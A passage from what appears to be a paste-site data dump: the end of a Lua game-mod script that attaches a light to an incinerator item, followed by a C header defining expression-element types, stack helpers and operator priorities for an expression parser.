    inst.components.incinerator:SetShouldIncinerateItemFn(ShouldIncinerateItem)

    -----------------------
    -- 创建灯光实体
    inst._light = SpawnPrefab(""furnacelight"")

    -- 监听位置变化，移动 light 位置（也可跟随角色）
    local function OnOwnerChange(inst)
        local owner = inst.components.inventoryitem and inst.components.inventoryitem.owner
        if owner ~= nil then
            inst._light.entity:SetParent(owner.entity)
            inst._light:ReturnToScene()
        else
            inst._light.entity:SetParent(inst.entity)
            --inst._light:RemoveFromScene()
        end
    end

    inst._onownerchange = function() OnOwnerChange(inst) end
    inst:ListenForEvent(""onputininventory"", inst._onownerchange)
    inst:ListenForEvent(""ondropped"", inst._onownerchange)

    -- 清理灯光实体函数
    local function KillLight(inst)
        if inst._light ~= nil then
            inst._light:Remove()
            inst._light = nil
        end
    end

    -- 监听物品被移除（被吃掉、摧毁等情况）
    inst:ListenForEvent(""onremove"", KillLight)
    -- 控制亮度（你可以自己控制发光条件）
    --inst._light.Light:SetIntensity(0.5) -- 或者动态调节
    inst._light.Light:Enable(true)
    
end)"
VrsczszU,Elements.h,Kienan,C,Friday 25th of July 2025 09:36:47 PM CDT,"#ifndef ELEMENTS_H
#define ELEMENTS_H

#define TRUE 1
#define FALSE 0

#define MAX_ELEMENTS_COUNT 128
#define MAX_OPERATOR_SYMBOLS_COUNT 8

typedef enum { // TODO: если нельзя использовать енамы, то тип ExpressionElementType нужно заменить на int, а конкретные варианты прописать через дефайны
    ELEMENT_TYPE_NUMBER,
    ELEMENT_TYPE_OPERATOR,
    ELEMENT_TYPE_FUNCTION,
    ELEMENT_TYPE_VARIABLE,
    ELEMENT_TYPE_LEFT_BRACE,
    ELEMENT_TYPE_RIGHT_BRACE
} ExpressionElementType;

typedef struct {
    ExpressionElementType type;
    char operator_symbol[MAX_OPERATOR_SYMBOLS_COUNT];
    double value;
} ExpressionElement;


typedef struct {
    ExpressionElement elements[MAX_ELEMENTS_COUNT];
    int count;
} ExpressionElementsArray;

// TODO: сомнительные методы для работы с массивом, лучше их убрать или отрефакторить
int is_array_empty(const ExpressionElementsArray *stack) {
    return stack->count == 0;
}

// TODO: сомнительные методы для работы с массивом, лучше их убрать или отрефакторить
void add_element_to_array(ExpressionElementsArray *stack, const ExpressionElement element) {
    if (stack->count < MAX_ELEMENTS_COUNT) {
        stack->elements[stack->count] = element;
        stack->count++;
    }
}

// TODO: сомнительные методы для работы с массивом, лучше их убрать или отрефакторить
ExpressionElement pop_element_from_array(ExpressionElementsArray *stack) {
    if (!is_array_empty(stack)) {
        const ExpressionElement popElement = stack->elements[stack->count - 1];
        stack->count--;
        return popElement;
    }
    const ExpressionElement empty_element = {0};
    return empty_element;
}

// TODO: сомнительные методы для работы с массивом, лучше их убрать или отрефакторить
ExpressionElement get_last_array_element(const ExpressionElementsArray *stack) {
    if (!is_array_empty(stack)) {
        return stack->elements[stack->count - 1];
    }
    const ExpressionElement empty_element = {0};
    return empty_element;
}

int get_operator_priority(const char operatorSymbol) {
    switch (operatorSymbol) {
        case '+':
        case '-': return 1;
        case '*':
        case '/': return 2;
        default: return 0;
    }
}

#endif
"
